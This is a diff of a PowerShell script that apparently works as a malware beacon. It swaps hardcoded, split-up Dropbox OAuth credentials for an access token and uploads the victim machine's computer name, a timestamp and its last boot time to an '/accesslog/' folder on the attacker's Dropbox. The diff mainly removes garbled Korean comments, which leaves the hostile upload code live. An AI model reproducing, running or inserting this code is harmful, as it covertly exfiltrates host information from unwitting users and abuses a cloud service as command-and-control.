@@ -12,40 +12,35 @@ Function PostBinary {
         $clientSecret = $clientSecret + "sacvnu3ec"
         $refreshToken = "xTNXeD_4290AAAAAAAAAAYa" 
         $refreshToken = $refreshToken + "eH0SAhvLpwW62c4nV9d8NgT3dInJP-ZTObTdFXN4t"
-        # Access Token ìš”ì²­ì„ ìœ„í•œ POST ìš”ì²­ ë°ì´í„° ì„¤ì •
         $body = @{
           grant_type = "refresh_token"
           refresh_token = $refreshToken
           client_id = $clientID
           client_secret = $clientSecret
         }
-    
-    # Access Token ìš”ì²­
     $tokenEndpoint = "https://api.dropboxapi.com/oauth2/token"
     $response = Invoke-RestMethod -Uri $tokenEndpoint -Method Post -Body $body
     $accessToken = ""
-    # ìš”ì²­ ê²°ê³¼ í™•ì¸
     if ($response.access_token) {
         $accessToken = $response.access_token
-        #Write-Host "ìƒˆë¡œìš´ Access Token: $newAccessToken"
+        
     } else {
-       # Write-Host "Access Tokenì„ ê°€ì ¸ì˜¤ëŠ” ë° ì‹¤íŒ¨í–ˆìŠµë‹ˆë‹¤."
-        #Write-Host "ì—ëŸ¬: $($response.error_summary)"
+        
     }
        $ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -ne 'Loopback' }).IPAddress
        $time_sata = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 	   $name = $name + $time_sata
+       
        $headers = @{
          "Authorization" = "Bearer $accessToken"
          "Content-Type" = "application/octet-stream"
          "Dropbox-API-Arg" = "{`"path`": `"/accesslog/$name`",`"mode`": `"add`"}"
         }
 
-        # íŒŒì¼ ì—…ë¡œë“œ ìš”ì²­ ë³´ë‚´ê¸°
+        
         $response = Invoke-RestMethod -Method Post -Uri $uploadUrl -Headers $headers -Body $updata
-	}
+}
 $dateString = [string](Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-# 2. 문자열을 UTF-8 바이트 배열로 변환
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($dateString)
 $cyhwjehbf = Get-Date -Format "MMdd_HHmm"
 PostBinary -bytes $bytes -name "$env:COMPUTERNAME--$cyhwjehbf.txt"
